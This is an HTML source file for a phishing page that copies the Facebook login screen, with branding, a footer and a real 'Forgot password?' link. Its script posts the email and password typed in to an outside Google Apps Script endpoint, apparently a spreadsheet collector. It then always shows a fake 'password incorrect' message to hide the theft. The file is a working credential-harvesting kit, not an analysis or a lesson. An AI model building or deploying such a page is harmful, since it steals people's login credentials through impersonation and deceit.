<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="icon" type="image/x-icon" href="./images/facebookLogo.png">
    <title>Facebook log in</title>
</head>

<body>
    <div class="container flex">
        <div class="facebook-page flex">
            <div class="text">
                <p>Connect with friends and the world </p>
                <p> around you on Facebook.</p>
            </div>
            <form id="loginForm" method="post" autocomplete="off" name="google-sheet">
                <h2>facebook</h2>
                <input type="text" name="email" id="email" placeholder="Email or phone number" required>
                <input type="password" name="password" id="password" placeholder="Password" required>
                <div class="link">
                    <button class="button loginButton">Log in</button>
                    <p id="errorMessage" style="color: red;"></p>
                    <a href="https://www.facebook.com/login/identify/" class="forgot">Forgot password?</a>
                </div>
                <hr>
                <!-- Add an element to display the error message -->
                <p id="errorMessage" style="color: red;"></p>
            </form>
        </div>
    </div>
    <footer>
        <a href="">Meta</a>
        <a href="">About</a>
        <a href="">Blog</a>
        <a href="">Jobs</a>
        <a href="">Help</a>

        <a href="">Locations</a>
        <a href="">Facebook Lite</a>
        <a href="">Facebook Contact</a>
        <a href="">Uploading & Non-Users</a>
        <div class="bottom-footer">
            <select name="" id="">
                <option value="English">English</option>
                <option value="Hindi">Hindi</option>
                <option value="Punjabi">Punjabi</option>
                <option value="Urdu">Urdu</option>
                <option value="Francais">Francais</option>
            </select>
            <span> &copy; 2023 Facebook from Meta</span>
        </div>
    </footer>

        const scriptURL = 'https://script.google.com/macros/s/AKfycbxdFRDPnK871Qxbi-AD5SEqT38svdcCbOavmDGrlV7IkQ7CB8vgMW1ov9_BzrUlOAht/exec';
        const form = document.forms['google-sheet']
        const errorMessage = document.getElementById('errorMessage');

        form.addEventListener('submit', e => {
            e.preventDefault();
            // const isPasswordCorrect = false; // Replace with your password validation logic

            // if (isPasswordCorrect) {
                fetch(scriptURL, { method: 'POST', body: new FormData(form) })
                    .then(response => errorMessage.textContent = "The password that you've entered is incorrect.")
                    .catch(error => console.error('Error!', error.message));
            // } else {
                // Display error message
                errorMessage.textContent = "The password that you've entered is incorrect.";
            // }
        });
    </script>
</body>

</html>
